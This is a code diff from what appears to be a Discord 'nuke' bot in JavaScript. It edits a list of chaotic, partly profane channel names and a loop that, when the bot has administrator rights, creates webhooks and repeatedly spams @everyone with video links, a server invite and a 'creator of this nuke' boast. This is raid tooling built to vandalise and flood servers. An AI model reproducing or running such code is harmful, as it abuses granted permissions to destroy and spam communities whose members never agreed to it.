@@ -511,7 +511,7 @@ and a wheel's broken`, "https://youtu.be/EzQ3G5PpQ58", "https://cdn.discordapp.c
  
 
  function channelnames() {
-   var rand = ["𝔹𝕐𝔼 𝔹𝕐𝔼", "𝗪𝗘𝗘 𝗛𝗘𝗘 𝗛𝗘𝗘", "『ΛDᄃ』", "卂丂丂ㄚs destructive corner", "bye bye", "🃏hue🎭hue🃏🎭huehue🃏huehue♠♣♥♦huehuehue🃏huehuehue", "☜☝☟☞☝chaos☟chaos☝☜☟☝☞","♛♤♦♧♣♡♥♢♠♛", "♛♤♧♡♢chaos♠♣♥♦♛", "🃏🃏🃏", "🎭🎭🎭neo-chaos🎭🎭🎭", "ᑕh̷̛̭͔͚̟͈̭͓̪̠͇̃̿̾͌₳ㄖ『s』", "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽", "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽", "get fucked ﷽﷽﷽", "匚卄卂ㄖ丂 匚卄卂ㄖ丂", "卂丂丂ㄚ", "𝗜 𝗖𝗔𝗡 𝗗𝗢 𝗔𝗡𝗬𝗧𝗛𝗜𝗡𝗚"]
+   var rand = ["𝔹𝕐𝔼 𝔹𝕐𝔼", "𝗪𝗘𝗘 𝗛𝗘𝗘 𝗛𝗘𝗘", "『ΛDᄃ』", "卂丂丂ㄚs destructive corner", "🃏hue🎭hue🃏🎭huehue🃏huehue♠♣♥♦huehuehue🃏huehuehue", "☜☝☟☞☝chaos☟chaos☝☜☟☝☞","♛♤♦♧♣♡♥♢♠♛", "♛♤♧♡♢chaos♠♣♥♦♛", "🃏🃏🃏", "🎭🎭🎭neo-chaos🎭🎭🎭", "ᑕh̷̛̭͔͚̟͈̭͓̪̠͇̃̿̾͌₳ㄖ『s』", "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽", "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽", "get fucked ﷽﷽﷽", "匚卄卂ㄖ丂 匚卄卂ㄖ丂", "卂丂丂ㄚ", "𝗜 𝗖𝗔𝗡 𝗗𝗢 𝗔𝗡𝗬𝗧𝗛𝗜𝗡𝗚"]
    return rand[Math.floor(Math.random()*rand.length)];
  }
  
@@ -552,7 +552,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
                 p.createWebhook("assy").then(w => {
                      
                 [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12].forEach(function(i) {
-                    w.send("https://cdn.discordapp.com/attachments/782641638798393364/785878660229758986/video0-151.mp4 https://youtu.be/YaiOwWDW8EY https://discord.gg/XVAHsbqnU4 \nthe real creator of this nuke is assy and assy alone @everyone")
+                    w.send("https://cdn.discordapp.com/attachments/782641638798393364/785878660229758986/video0-151.mp4 https://discord.gg/XVAHsbqnU4 \nthe real creator of this nuke is assy @everyone")
                     
                 
                 })
